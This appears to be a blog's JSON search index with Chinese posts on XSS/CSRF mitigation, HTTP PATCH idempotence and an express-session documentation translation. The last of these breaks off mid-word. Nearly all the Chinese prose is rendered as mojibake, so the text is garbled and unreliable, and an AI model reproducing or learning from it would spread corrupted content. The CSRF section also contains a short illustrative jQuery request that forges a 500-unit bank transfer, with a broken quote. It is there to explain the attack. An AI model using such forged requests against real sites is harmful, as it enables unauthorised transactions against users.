æ˜¯å¦å­˜å‚¨åœ¨åˆæ³•æœåŠ¡å™¨ä¸­ï¼Œç½‘å‹ä¹Ÿæœ‰æåˆ°åå°„å‹éœ€è¦æ¬ºéª—ç”¨æˆ·ç‚¹å‡»é“¾æ¥ï¼Œè€ŒæŒä¹…å‹ç”¨æˆ·è®¿é—®ç›¸å…³é¡µé¢å°±ç›´æ¥è§¦å‘ã€‚\n\n### ç¼“è§£åŠæ³•\n\næ ¹æ®æ”»å‡»åŸç†ï¼Œå¯å¾—å‡ºå¦‚ä¸‹ç¼“è§£åŠæ³•ï¼ˆä¸»è¦æ ¸å¿ƒæ˜¯ç¬¬ä¸€æ¡ â€”â€” **è­¦æƒ•ç”¨æˆ·è¾“å…¥**ï¼‰ï¼š\n\n* **éªŒè¯ç”¨æˆ·è¾“å…¥æˆ–è€…åšå†…å®¹è½¬ä¹‰**\n\n* å¯¹äºåå°„å‹ï¼Œå¯ä»¥æé†’ç”¨æˆ·å°å¿ƒæ¶æ„é“¾æ¥ï¼ˆè¿™ä¸ªå‡ ä¹æ²¡ç”¨ã€‚ã€‚ã€‚ï¼‰æˆ–è€…æµè§ˆå™¨å¯¹ URL åšè¯†åˆ«ï¼ˆChromeï¼ŒFirefoxéƒ½æ”¯æŒï¼‰\n\n* å¯¹äºç›—ç”¨ Cookie ï¼Œè®¾ç½® HttpOnly å±æ€§æ¥ä¿è¯ JavaScript ä»£ç æ— æ³•è®¿é—® cookie\n\n## XSS å»¶ä¼¸ä¹‹ CSRF\n\nå› ä¸ºéƒ½æ˜¯ Cross-Siteï¼ŒXSS å’Œ CSRF æœ‰æ—¶å€™ä¸€èµ·å‡ºç°å°½ç®¡ä»–ä»¬å¹¶ä¸ç›¸åŒï¼ŒCSRF æ˜¯ Cross-Site Request Forgery (è·¨ç«™è¯·æ±‚ä¼ªé€ )ï¼ŒCSRF æ”»å‡»**é€šè¿‡ä¼ªè£…æˆå—ä¿¡ä»»ç”¨æˆ·çš„è¯·æ±‚æ¥åˆ©ç”¨å—ä¿¡ä»»çš„ç½‘ç«™**ï¼Œä¸ç®¡ä½¿ç”¨ä»€ä¹ˆæ–¹æ³•åªè¦æ˜¯ä¼ªé€ ç”¨æˆ·å‘èµ·çš„è¯·æ±‚éƒ½å¯ä»¥ç§°ä¸º CSRF æ”»å‡»ã€‚\n\n### ä¾‹å­\n\nç”¨æˆ·è®¿é—®é“¶è¡Œçš„ç½‘ç«™ï¼Œ**åœ¨ Session è¿˜æœªè¿‡æœŸçš„æƒ…å†µä¸‹ï¼ˆä¼ªé€ ç”¨æˆ·èº«ä»½çš„å…³é”®ï¼‰** ï¼Œè®¿é—®äº†å±é™©ç½‘ç«™ï¼Œå±é™©ç½‘ç«™æ‰§è¡Œå¦‚ä¸‹ä»£ç \n\n```javascript\n$.post('/www.bank.com/transfer?amt=500&transferTo=B, function(data) { } );\n```\n\nè¿™æ—¶å€™ç”¨æˆ·åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹è½¬è´¦ç»™äº†ç”¨æˆ·B 500å…ƒã€‚  \n\n### ç¼“è§£åŠæ³•\n\nä¸éš¾çœ‹å‡ºï¼Œä»¥ä¸Šæ¶æ„ç½‘ç«™å‘å‡ºçš„è¯·æ±‚æ˜¯è·¨åŸŸè¯·æ±‚ï¼Œåœ¨åŒæºç­–ç•¥ï¼ˆSame Origin Policyï¼‰æœªè¢«ç¦ç”¨æ—¶ä¼šè¢«æ‹¦æˆªï¼Œå³ä½¿æ”»å‡»è€…é€šè¿‡ iframe/form æ¥æˆåŠŸå‘é€è¯¥è¯·æ±‚ï¼ˆæ‰çŸ¥é“è¡¨å•å…è®¸è·¨åŸŸï¼Œå› ä¸ºæ— æ³•è·å–è¡¨å•æäº¤åçš„ç»“æœï¼‰ï¼ŒæœåŠ¡å™¨ç«¯ä¹Ÿå¯ä»¥**é€šè¿‡æ£€æŸ¥ Referer æ¥åˆ¤æ–­è¯·æ±‚æ¥æºæ˜¯å¦åˆæ³•ã€‚**  \nä½†æ˜¯ï¼Œå¦‚æœé“¶è¡Œä½¿ç”¨çš„æ˜¯ GET è¯·æ±‚æ¥å®Œæˆè½¬è´¦æ“ä½œï¼Œæ”»å‡»è€…å¯ä»¥ç»“åˆ XSS æ¥åšåˆ° CSRF æ”»å‡»ï¼Œåªéœ€è¦å€ŸåŠ©ä»¥ä¸Š XSS åŠæ³•è®©ç”¨æˆ·ç‚¹å‡»è¯·æ±‚çš„ URL å³å¯ï¼Œè¿™ç§æƒ…å†µä¸‹çš„ CSRF åˆå« XSRFã€‚è¿™ç§æƒ…å†µä¸‹**é€šè¿‡æ”¹è‰¯ç½‘ç«™çš„ API è®¾è®¡æé«˜ CSRF æ”»å‡»çš„é—¨æ§›ã€‚**   \n**å¯¹ç³»ç»Ÿçš„å…³é”®æ“ä½œæ·»åŠ éªŒè¯ç ä¹Ÿæ˜¯æœ‰æ•ˆæŠµæŠ— CSRF æ”»å‡»çš„åŠæ³•**ï¼Œå› ä¸º \"CSRF æ”»å‡»å¾€å¾€æ˜¯åœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ„é€ äº†ç½‘ç»œè¯·æ±‚ã€‚è€ŒéªŒè¯ç ä¼šå¼ºåˆ¶ç”¨æˆ·å¿…é¡»ä¸åº”ç”¨è¿›è¡Œäº¤äº’ï¼Œæ‰èƒ½å®Œæˆæœ€ç»ˆè¯·æ±‚\" ã€‚  \nä¸è¿‡é’ˆå¯¹ CSRF æœ€å¸¸ç”¨çš„æ–¹æ³•è¿˜æ˜¯ä½¿ç”¨ CSRF-Token ï¼Œé€šè¿‡åœ¨æ¯æ¬¡è¯·æ±‚çš„è¯·æ±‚å¤´ä¸­æ·»åŠ  Tokenï¼ŒæœåŠ¡å™¨æ£€æŸ¥ Token å¯ä»¥æœ‰æ•ˆé˜²æ­¢ CSRF æ”»å‡»ã€‚\n\n### CSRF ä¸ XSS çš„åŒºåˆ«\n\nä¸€å¥è¯æ€»ç»“ï¼š**XSS åˆ©ç”¨çš„æ˜¯ç½‘ç«™å¯¹ç”¨æˆ·ï¼ˆè¾“å…¥ï¼‰çš„ä¿¡ä»»ï¼ŒCSRF åˆ©ç”¨çš„æ˜¯ç½‘ç«™å¯¹ç”¨æˆ·ç½‘é¡µæµè§ˆå™¨çš„ä¿¡ä»»ã€‚**\n\n## å‚è€ƒ\n\n* <https://blog.sqreen.com/reflected-xss/>\n* <https://www.imperva.com/learn/application-security/reflected-xss-attacks/?utm_campaign=Incapsula-moved>\n* <https://www.owasp.org/index.php/DOM_Based_XSS>\n* <http://jartto.wang/2017/12/15/xss-and-csrf/>\n* <https://github.com/dwqs/blog/issues/68>\n* <https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/>\n* <https://juejin.im/post/5bc009996fb9a05d0a055192>","tags":["Web Security"]},{"title":"ä¸ºä»€ä¹ˆ HTTP PATCH æ–¹æ³•ä¸æ˜¯å¹‚ç­‰çš„åŠå…¶å»¶ä¼¸","url":"/2019/04/07/http-patch-idempotence/","content":"\n\n## å¹‚ç­‰æ€§\n\né¦–å…ˆæ¥çœ‹ä»€ä¹ˆæ˜¯å¹‚ç­‰æ€§ï¼Œæ ¹æ® [rfc2616(Hypertext Transfer Protocol -- HTTP/1.1)](https://www.ietf.org/rfc/rfc2616.txt) æ–‡æ¡£ç¬¬ 50 é¡µåº•éƒ¨å¯¹ Idempotent Methods çš„å®šä¹‰ï¼š  \n\n> Methods can also have the property of \"idempotence\" in that (aside from error or expiration issues) the side-effects of N > 0 identical requests is the same as for a single request. \n\nç¿»è¯‘è¿‡æ¥ä¹Ÿå°±æ˜¯ï¼š**ç›¸åŒçš„è¯·æ±‚æ‰§è¡Œå¤šæ¬¡å’Œæ‰§è¡Œä¸€æ¬¡çš„å‰¯ä½œç”¨æ˜¯ä¸€æ ·çš„**ã€‚\n\næ®µè½æ¥ä¸‹æ¥å°±ç»™å‡ºäº†å…·æœ‰å¹‚ç­‰æ€§çš„æ–¹æ³•ï¼š\n\n> The methods GET, HEAD, PUT and DELETE share this property. Also, the methods OPTIONS and TRACE SHOULD NOT have side effects, and so are inherently idempotent.\n\nå¯ä»¥çœ‹å‡ºï¼Œ`GET`ï¼Œ`HEAD`ï¼Œ`PUT`ï¼Œ`DELETE`ï¼Œ`OPTIONS` å’Œ `TRACE` æ–¹æ³•éƒ½æ˜¯å¹‚ç­‰çš„ã€‚\n\n## PUT å’Œ PATCH\n\næ ¹æ®çº¦å®š( Convention )ï¼ŒPUT æ–¹æ³•ç”¨äºæ›´æ–°æ•°æ®ï¼ŒPATCH æ–¹æ³•ä¹Ÿç”¨äºæ›´æ–°æ•°æ®ï¼Œä¸ºä»€ä¹ˆ PUT æ–¹æ³•æ˜¯å¹‚ç­‰çš„è€Œ PATCH æ–¹æ³•ä¸æ˜¯å¹‚ç­‰çš„å‘¢ï¼Ÿæˆ‘ä»¬ç»§ç»­ç ”ç©¶æ–‡æ¡£ï¼ˆç¬¬54é¡µï¼‰ï¼š  \n\n> The PUT method requests that the enclosed entity be stored under the supplied Request-URI. If the Request-URI refers to an already existing resource, the enclosed entity SHOULD be considered as a modified version of the one residing on the origin server. If the Request-URI does not point to an existing resource, and that URI is capable of being defined as a new resource by the requesting user agent, the origin server can create the resource with that URI.\n>\n> PUT æ–¹æ³•å°†è¯·æ±‚æ‰€åŒ…å«çš„å®ä½“å­˜å‚¨åœ¨æ‰€æä¾›çš„ Request-URI ä¸‹ã€‚å¦‚æœè¯¥ URI æŒ‡ä»£ä¸€ä¸ªå·²ç»å­˜åœ¨çš„èµ„æºï¼Œé‚£ä¹ˆè¯·æ±‚ä¸­çš„å®ä½“åº”è¯¥è¢«è§†ä¸ºä¿å­˜åœ¨åŸæœåŠ¡å™¨ä¸Šçš„å®ä½“çš„ä¿®æ”¹ç‰ˆæœ¬ã€‚å¦‚æœ Request-URI æ²¡æœ‰æŒ‡å‘ä¸€ä¸ªç°æœ‰èµ„æºï¼Œå¹¶ä¸”è¯¥ URI å¯ä»¥è¢«å‘é€è¯·æ±‚çš„ç”¨æˆ·ä»£ç†å®šä¹‰ä¸ºæ–°èµ„æºï¼Œåˆ™åŸæœåŠ¡å™¨å¯ä»¥ä½¿ç”¨è¯¥ URI æ¥åˆ›å»ºèµ„æºã€‚\n\nè¿™é‡Œè¯´çš„å¾ˆæ˜ç™½äº†ï¼ŒPUT ç”¨åšæ›´æ–°æ“ä½œçš„æ—¶å€™æ˜¯æäº¤ä¸€æ•´ä¸ªæ›´æ–°åçš„å®ä½“ï¼Œè€Œä¸æ˜¯éœ€è¦ä¿®æ”¹çš„å®ä½“ä¸­çš„éƒ¨åˆ†å±æ€§ã€‚**å½“ URI æŒ‡å‘ä¸€ä¸ªå­˜åœ¨çš„èµ„æºï¼ŒæœåŠ¡å™¨è¦åšçš„äº‹å°±æ˜¯æŸ¥æ‰¾å¹¶æ›¿æ¢ã€‚**\n\næ¥ä¸‹æ¥çœ‹ [PATCH](<https://tools.ietf.org/html/rfc5789>)ï¼ˆPATCH æ–¹æ³•åœ¨åŸæ–‡æ¡£ä¸­æ²¡æœ‰æ‰¾åˆ°ç›¸å…³æè¿°ï¼Œåæ¥å‘ç°åœ¨å¦ä¸€ä¸ª RFC é‡Œé¢ - `RFC5789`ï¼‰:\n\n> The PATCH method requests that a set of changes described in the request entity be applied to the resource identified by the Request-URI.  The set of changes is represented in a format called a \"patch document\" identified by a media type.  If the Request-URI does not point to an existing resource, the server MAY create a new resource, depending on the patch document type (whether it can logically modify a null resource) and permissions, etc.\n>\n> PATCH æ–¹æ³•è¯·æ±‚å°†ä¸€ç»„æè¿°åœ¨è¯·æ±‚å®ä½“é‡Œçš„æ›´æ”¹åº”ç”¨åˆ° Request-URI æ ‡å¿—çš„èµ„æºã€‚è¿™ç»„æ›´æ”¹ä»¥ç§°ä¸º \"è¡¥ä¸æ–‡æ¡£\" çš„æ ¼å¼ï¼ˆè¯¥æ ¼å¼ç”±åª’ä½“ç±»å‹æ ‡å¿—ï¼‰è¡¨ç¤ºï¼Œå¦‚æœ Request-URI æœªæŒ‡å‘ç°æœ‰èµ„æºï¼ŒæœåŠ¡å™¨å¯èƒ½æ ¹æ®è¡¥ä¸æ–‡æ¡£çš„ç±»å‹ï¼ˆæ˜¯å¦å¯ä»¥åœ¨é€»è¾‘ä¸Šä¿®æ”¹ç©ºèµ„æºï¼‰å’Œæƒé™ç­‰æ¥åˆ›å»ºä¸€ä¸ªæ–°èµ„æºã€‚\n\næ‰€ä»¥å¯ä»¥çŸ¥é“ **PATCH è¯·æ±‚ä¸­çš„å®ä½“æ˜¯ä¸€ç»„å°†è¦åº”ç”¨åˆ°å®ä½“çš„æ›´æ”¹ï¼Œè€Œä¸æ˜¯åƒ PUT è¯·æ±‚é‚£æ ·æ˜¯è¦æ›¿æ¢æ—§èµ„æºçš„å®ä½“**ï¼Œä½†æ˜¯è¿™å¹¶æ²¡æœ‰è§£å†³ PATCH æ–¹æ³•ä¸ºä»€ä¹ˆä¸æ˜¯å¹‚ç­‰çš„é—®é¢˜ã€‚ä¸ç€æ€¥ï¼Œç»§ç»­è¯»ï¼Œæ¥ä¸‹æ¥å°±ç»™å‡ºäº† PUT å’Œ PATCH çš„åŒºåˆ«ï¼š\n\n> The difference between the PUT and PATCH requests is reflected in the way the server processes the enclosed entity to modify the resource identified by the Request-URI.  In a PUT request, the enclosed entity is considered to be a modified version of the resource stored on the origin server, and the client is requesting that the stored version be replaced.  With PATCH, however, the enclosed entity contains a set of instructions describing how a resource currently residing on the origin server should be modified to produce a new version.  The PATCH method affects the resource identified by the Request-URI, and it also MAY have side effects on other resources; i.e., new resources may be created, or existing ones modified, by the application of a PATCH.\n>\n> PUT å’Œ PATCH è¯·æ±‚çš„åŒºåˆ«ä½“ç°åœ¨æœåŠ¡å™¨å¤„ç†å°é—­å®ä½“ä»¥ä¿®æ”¹ Request-URI æ ‡å¿—çš„èµ„æºçš„æ–¹å¼ã€‚åœ¨ä¸€ä¸ª PUT è¯·æ±‚ä¸­ï¼Œå°é—­å®ä½“è¢«è®¤ä¸ºæ˜¯å­˜å‚¨åœ¨æºæœåŠ¡å™¨ä¸Šçš„èµ„æºçš„ä¿®æ”¹ç‰ˆæœ¬ï¼Œå¹¶ä¸”å®¢æˆ·ç«¯æ­£åœ¨è¯·æ±‚æ›¿æ¢å­˜å‚¨çš„ç‰ˆæœ¬ã€‚è€Œå¯¹äº PATCH è¯·æ±‚ï¼Œå°é—­å®ä½“ä¸­åŒ…å«äº†ä¸€ç»„æè¿°å½“å‰ä¿ç•™åœ¨æºæœåŠ¡å™¨ä¸Šçš„èµ„æºåº”è¯¥å¦‚ä½•è¢«ä¿®æ”¹æ¥äº§ç”Ÿä¸€ä¸ªæ–°ç‰ˆæœ¬çš„æŒ‡ä»¤ã€‚PATCH æ–¹æ³•å½±å“ç”± Request-URI æ ‡å¿—çš„èµ„æºï¼Œè€Œä¸”å®ƒä¹Ÿå¯èƒ½å¯¹å…¶ä»–èµ„æºæœ‰å‰¯ä½œç”¨ï¼›ä¹Ÿå°±æ˜¯ï¼Œé€šè¿‡ä½¿ç”¨ PATCHï¼Œæ–°èµ„æºå¯èƒ½è¢«åˆ›é€ ï¼Œæˆ–è€…ç°æœ‰èµ„æºè¢«ä¿®æ”¹ã€‚\n\nä»¥ä¸Šå°±æ˜¯ç­”æ¡ˆã€‚å¯ä»¥ç†è§£ä¸ºï¼Œ**PATCH è¯·æ±‚ä¸­çš„å®ä½“ä¿å­˜çš„æ˜¯ä¿®æ”¹èµ„æºçš„æŒ‡ä»¤ï¼Œè¯¥æŒ‡ä»¤æŒ‡å¯¼æœåŠ¡å™¨æ¥å¯¹èµ„æºåšå‡ºä¿®æ”¹**ï¼Œæ‰€ä»¥ä¸æ˜¯å¹‚ç­‰çš„ã€‚  \nå¯èƒ½æœ‰ç‚¹æŠ½è±¡ï¼Œæ‰“ä¸ªæ¯”æ–¹ï¼šå¯¹äºå­˜åœ¨æœåŠ¡å™¨ä¸­çš„ A å¯¹è±¡æœ‰ä¸ªå±æ€§ B ä¸º 1ï¼Œå¦‚æœè¦ä¿®æ”¹ B å±æ€§ä¸º 3ï¼Œåˆ™ PUT è¯·æ±‚æ˜¯ç›´æ¥å°†ä¿®æ”¹è¿‡ B å±æ€§çš„æ•´ä¸ªæ–°å¯¹è±¡å‘é€ç»™æœåŠ¡å™¨æŸ¥æ‰¾å¹¶æ›¿æ¢ã€‚è€Œ PATCH è¯·æ±‚æ˜¯åœ¨å®ä½“ä¸­åŒ…å«æŒ‡ä»¤ â€” å°† A å¯¹è±¡ä¸­ B å±æ€§çš„å€¼åŠ  2ï¼Œé‚£ä¹ˆå¦‚æœè¯¥è¯·æ±‚è¢«æ‰§è¡Œå¤šæ¬¡çš„è¯ï¼ŒB å±æ€§å°±å¯èƒ½ä¸ä¸º 3 äº†ï¼Œè€Œ PUT è¯·æ±‚ä¸è®ºæ‰§è¡Œå¤šå°‘æ¬¡ï¼ŒB å±æ€§æ°¸è¿œéƒ½æ˜¯ 3ï¼Œæ‰€ä»¥è¯´ PUT æ–¹æ³•æ˜¯å¹‚ç­‰çš„ï¼Œè€Œ PATCH æ–¹æ³•ä¸æ˜¯å¹‚ç­‰çš„ã€‚\n\n## PUT å’Œ POST\n\nåœ¨çœ‹è¯·æ±‚ç›¸å…³çš„å¸–å­çš„æ—¶å€™ï¼Œå¶å°”ä¹Ÿä¼šçœ‹è§äº‰è®ºè¯´ä½¿ç”¨ PUT æ¥æ–°å¢èµ„æºï¼Œä½¿ç”¨ POST æ¥ä¿®æ”¹èµ„æºï¼Œæˆ–è€…è¯´è¿™ä¸¤ä¸ªæ–¹æ³•å·®åˆ«ä¸å¤§ï¼Œæ²¡å¿…è¦è¿™ä¹ˆæ˜ç¡®åˆ†å·¥ã€‚ä¸Šæ–‡ä¹Ÿæåˆ°äº† PUT æ–¹æ³•çš„ URI æŒ‡å‘çš„èµ„æºä¸å­˜åœ¨çš„æ—¶å€™ä¹Ÿå¯ä»¥åˆ›å»ºæ–°èµ„æºã€‚é‚£åˆ°åº•æ€ä¹ˆç”¨ï¼Œéƒ½å†™åˆ°è¿™é‡Œäº†ç»§ç»­æ˜¯ç”¨æ–‡æ¡£æ¥è¯´è¯ï¼Œæœ‰å…³ POST æ–¹æ³•çš„è¯´æ˜ï¼š\n\n> **The POST method is used to request that the origin server accept the entity enclosed in the request as a new subordinate of the resource identified by the Request-URI in the Request-Line.** POST is designed to allow a uniform method to cover the following functions:  \n>\n> - Annotation of existing resources;\n> - Posting a message to a bulletin board, newsgroup, mailing list or similar group of articles;\n> - Providing a block of data, such as the result of submitting a form, to a data-handling process;\n> - Extending a database through an append operation.\n>\n> The actual function performed by the POST method is determined by the server and is usually dependent on the Request-URI. The posted entity is subordinate to that URI in the same way that a file is subordinate to a directory containing it, a news article is subordinate to a newsgroup to which it is posted, or a record is subordinate to a database.\n>\n> **POST æ–¹æ³•ç”¨äºè¯·æ±‚æºæœåŠ¡å™¨æ¥å—è¯·æ±‚ä¸­çš„å®ä½“ä½œä¸º Request-URI æ‰€æ ‡å¿—çš„èµ„æºçš„æ–°ä¸‹çº§ã€‚** POST æ–¹æ³•æ—¨åœ¨å…è®¸ä¸€ä¸ªç»Ÿä¸€çš„æ–¹æ³•æ¥æ¶µç›–ä»¥ä¸‹åŠŸèƒ½ï¼š\n>\n> - ç°æœ‰èµ„æºçš„æ³¨é‡Šï¼›\n> - åœ¨å…¬å‘Šæ ï¼Œæ–°é—»ç»„ï¼Œé‚®ä»¶åˆ—è¡¨æˆ–ç±»ä¼¼æ–‡ç« ç»„ä¸­å‘å¸ƒæ¶ˆæ¯;\n> - æä¾›æ•°æ®å—ï¼Œä¾‹å¦‚æäº¤è¡¨å•çš„ç»“æœï¼Œæ•°æ®å¤„ç†è¿‡ç¨‹;\n> - é€šè¿‡è¿½åŠ æ“ä½œæ‰©å±•æ•°æ®åº“ã€‚\n>\n> POSTæ–¹æ³•æ‰§è¡Œçš„å®é™…åŠŸèƒ½ç”±æœåŠ¡å™¨ç¡®å®šï¼Œé€šå¸¸ä¾èµ–äº Request-URIã€‚ å‘å¸ƒçš„å®ä½“ä»å±äºè¯¥ URIï¼Œå…¶æ–¹å¼ä¸æ–‡ä»¶ä»å±äºåŒ…å«å®ƒçš„ç›®å½•ç›¸åŒï¼Œæ–°é—»æ–‡ç« ä»å±äºå‘å¸ƒå®ƒçš„æ–°é—»ç»„ï¼Œæˆ–è€…è®°å½•ä»å±äºæ•°æ®åº“ã€‚\n\nåŠ é»‘çš„ç¬¬ä¸€å¥è¯æ˜¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œç”¨ RESTful API å®ç°å‰åç«¯äº¤äº’æ¥å£çš„æœ‹å‹çœ‹åˆ°è¿™é‡Œåº”è¯¥å°±æ¸…æ¥šäº†ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆ `POST /api/articles` åœ¨ RESTful ä¸­è¢«å»ºè®®ç”¨æ¥åˆ›å»ºæ–‡ç« è€Œä¸æ˜¯æ›´æ–°æ–‡ç« çš„åŸå› ã€‚æ­¤å¤–ï¼ŒPOST è¯·æ±‚ä¸æ˜¯å¹‚ç­‰çš„ï¼Œä»¥ä¸ºç€å¦‚æœæŠŠå®ƒç”¨æ¥å½“ä½œèµ„æºæ›´æ–°æ“ä½œï¼Œä¼šåˆ›é€ å¤šä¸ªç›¸åŒçš„èµ„æºï¼Œè¿™æ˜¯æ›´æ–°æ“ä½œä¸å¸Œæœ›äº§ç”Ÿçš„å‰¯ä½œç”¨ï¼Œæ‰€ä»¥è¿˜æ˜¯ç”¨ POST æ–°å¢èµ„æºï¼ŒPUT æ›´æ–°èµ„æºå§ã€‚\n\nå½“ç„¶ï¼Œè¿™äº›éƒ½æ˜¯çº¦å®š( convertion )  è€Œä¸æ˜¯è§„å®š( standard )ï¼Œå¦‚æœä½ å°±æ˜¯å–œæ¬¢ç”¨ PUT æ–°å»ºèµ„æºï¼ŒPOST æ¥ä¿®æ”¹èµ„æºï¼Œé‚£æˆ‘åªèƒ½è¯´å¯¹ä¸èµ·è®©ä½ èŠ±è¿™ä¹ˆé•¿æ—¶é—´çœ‹ç¯‡æ–‡ç« äº†ï¼Œæ¯•ç«Ÿä»…ä»…ä½¿ç”¨ GET å’Œ POST å®Œæˆæ‰€æœ‰æ“ä½œè¿˜å¤§æœ‰äººåœ¨ğŸ˜„ğŸ˜„ã€‚","tags":["HTTP"]},{"title":"ç¿»è¯‘ express-session ä½¿ç”¨æ–‡æ¡£","url":"/2019/04/04/express-session-translate/","content":"> [æ–‡æ¡£åŸç½‘å€](https://www.npmjs.com/package/express-session)  \n\nä»¥ä¸‹ç¿»è¯‘æ­£æ–‡\n\n## Installation\nè¿™æ˜¯ä¸€ä¸ªé€šè¿‡ [npm registry](https://www.npmjs.com/) å¯ç”¨çš„ [Node.js](https://nodejs.org/en/) æ¨¡å—ã€‚ä½¿ç”¨ä»¥ä¸‹ `npm install` å‘½ä»¤æ¥å®Œæˆå®‰è£…ã€‚\n```sh\n$ npm install express-session\n```\n## API\n\n```javascript\nvar session = require('express-session');\n```\n\n### sessions(options)\nä½¿ç”¨ç»™å®šé€‰é¡¹åˆ›å»ºä¸€ä¸ª session ä¸­é—´ä»¶ã€‚  \n**æ³¨æ„**ï¼šåªæœ‰ session ID æ˜¯ä¿å­˜åœ¨ cookie ä¸­ï¼ŒSession æ•°æ®æœ¬èº«å¹¶ä¸æ˜¯ã€‚Session æ•°æ®æ˜¯å­˜åœ¨æœåŠ¡ç«¯ã€‚  \n**æ³¨æ„**ï¼šä»ç‰ˆæœ¬ 1.5.0 èµ·ï¼Œæœ¬æ¨¡å—ä¸å†éœ€è¦ [cookie-parser](https://www.npmjs.com/package/cookie-parser) ä¸­é—´ä»¶æ¥è¿è¡Œã€‚æœ¬æ¨¡å—ç°åœ¨ç›´æ¥åœ¨ req/res ä¸Šè¯»å†™ cookiesã€‚å½“æœ¬æ¨¡å—å’Œ cookie-parser çš„ `secret` ä¸ä¸€è‡´æ—¶ï¼Œä½¿ç”¨ cookie-parser å¯èƒ½ä¼šå¯¼è‡´é—®é¢˜ã€‚  \n**è­¦å‘Š**ï¼šé»˜è®¤çš„æœåŠ¡ç«¯ session å­˜å‚¨ï¼ŒMemoryStoreï¼Œ**ç‰¹æ„**æ²¡æœ‰ä¸ºç”Ÿäº§ç¯å¢ƒè€Œè®¾è®¡ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå®ƒå¯èƒ½ä¼šå¯¼è‡´å†…å­˜æ³„æ¼ï¼Œä¸ä¼šæ‰©å±•è¿‡å•ä¸ªè¿›ç¨‹ï¼Œè€Œä¸”æ˜¯ç”¨äºè°ƒè¯•å’Œå¼€å‘ã€‚  \nå¯¹äºå­˜å‚¨åˆ—è¡¨ï¼Œè¯·æŸ¥çœ‹[å…¼å®¹çš„ session å­˜å‚¨](#compatible-session-stores)\n#### Options\nexpress-session åœ¨ options å¯¹è±¡ä¸­æ¥æ”¶ä»¥ä¸‹å‚æ•°ï¼š\n##### cookie\nsession ID cookie çš„è®¾ç½®å¯¹è±¡ã€‚é»˜è®¤å€¼ä¸º `{ path: '/', httpOnly: true, secure: false, maxAge: null }`.\n\nä¸‹åˆ—å‚æ•°å¯é€‰è®¾ç½®æ”¾å…¥ cookie å¯¹è±¡ã€‚\n\n###### cookie.domain\n\nä¸º Set-Cookie å±æ€§æŒ‡å®š domainã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ²¡æœ‰è®¾ç½® domainï¼Œå¹¶ä¸”å¤§å¤šæ•°å®¢æˆ·ç«¯ä¼šå°† cookie è§†ä¸ºä»…åº”ç”¨äºå½“å‰ domainã€‚\n\n###### cookie.expires\n\nä¸º Set-Cookie å±æ€§ä¸­çš„ Expires æŒ‡å®š Date å¯¹è±¡ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ²¡æœ‰è®¾ç½® expiresï¼Œå¤§å¤šæ•°å®¢æˆ·ç«¯ä¼šå°†è§†è¿™ä¸ªä¸º \"éæŒä¹…åŒ– cookie\" å¹¶ä¸”åœ¨åƒé€€å‡ºæµè§ˆå™¨åº”ç”¨çš„åœºæ™¯ä¸‹åˆ é™¤è¯¥ cookieã€‚  \n**æ³¨æ„**ï¼šå¦‚æœ options å¯¹è±¡ä¸­åŒæ—¶è®¾ç½®äº† expires å’Œ maxAgeï¼Œé‚£ä¹ˆå°†è¢«ç”¨åˆ°çš„æ˜¯åœ¨å¯¹è±¡ä¸­æœ€åä¸€ä¸ªè¢«å®šä¹‰çš„å±æ€§ã€‚  \n**æ³¨æ„**ï¼šexpires é€‰é¡¹ä¸åº”è¯¥è¢«ç›´æ¥è®¾ç½®ï¼›è€Œåº”è¯¥åªä½¿ç”¨ maxAge é€‰é¡¹ã€‚\n\n###### cookie.httpOnly\n\nä¸º Set-Cookie å±æ€§ä¸­çš„ HttpOnly æŒ‡å®š boolean å€¼ã€‚å½“ä¸ºçœŸå€¼ï¼ŒHttpOnly å±æ€§è¢«è®¾ç½®ï¼Œå¦åˆ™ä¸è¢«è®¾ç½®ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒHttpOnly å±æ€§æ˜¯è¢«è®¾ç½®çš„ã€‚  \n**æ³¨æ„**ï¼šè®¾ç½®è¯¥å€¼ä¸º true çš„æ—¶å€™è¦å°å¿ƒï¼Œå› ä¸ºæœä»åè®®çš„å®¢æˆ·ç«¯ä¸ä¼šå…è®¸ JavaScript åœ¨ document.cookie ä¸­æŸ¥çœ‹ cookieã€‚\n\n###### cookie.maxAge\n\næŒ‡å®šå½“è®¡ç®— Set-Cookie å±æ€§ä¸­çš„ Expires æ—¶ä½¿ç”¨çš„ number ï¼ˆæ¯«ç§’ï¼‰å€¼ã€‚è¿™æ˜¯é€šè¿‡è·å–å½“å‰æœåŠ¡å™¨æ—¶é—´å¹¶å°† maxAge æ¯«ç§’æ•°åŠ å…¥å…¶ä¸­è®¡ç®— Expires æ—¥æœŸæ—¶é—´æ¥å®Œæˆçš„ã€‚é»˜è®¤æƒ…å†µä¸‹æ²¡æœ‰è®¾ç½® maxAgeã€‚  \n**æ³¨æ„**ï¼šå¦‚æœ options å¯¹è±¡ä¸­åŒæ—¶è®¾ç½®äº† expires å’Œ maxAgeï¼Œé‚£ä¹ˆå°†è¢«ç”¨åˆ°çš„æ˜¯åœ¨å¯¹è±¡ä¸­æœ€åä¸€ä¸ªè¢«å®šä¹‰çš„å±æ€§ã€‚\n\n###### cookie.path\n\nä¸º Set-Cookie å±æ€§æŒ‡å®š Path å€¼ã€‚é»˜è®¤æƒ…å†µä¸‹è¯¥å€¼è¢«è®¾ä¸º `'/'`ï¼Œä¹Ÿå°±æ˜¯ domain ä¸‹çš„æ ¹è·¯å¾„ã€‚\n\n###### cookie.sameSite\n\nä¸º Set-Cookie å±æ€§ä¸­çš„ SameSite æŒ‡å®š boolean æˆ–è€… string å€¼ã€‚å…¶ä¸­ï¼Œ\n\n* `true` ä¼šå°† SameSite å±æ€§è®¾ä¸º Strict ä»¥å®ç°ä¸¥æ ¼çš„ç›¸åŒç«™ç‚¹å¼ºåˆ¶ã€‚\n* `false` ä¸ä¼š SameSite å±æ€§ã€‚\n* `'lax'` ä¼šå°† SameSite å±æ€§è®¾ç½®ä¸º Lax ä»¥å®ç°å®½æ¾çš„ç›¸åŒç«™ç‚¹å¼ºåˆ¶ã€‚\n* `'strict'` ä¼šå°† SameSite å±æ€§è®¾ç½®ä¸º Strict ä»¥å®ç°ä¸¥æ 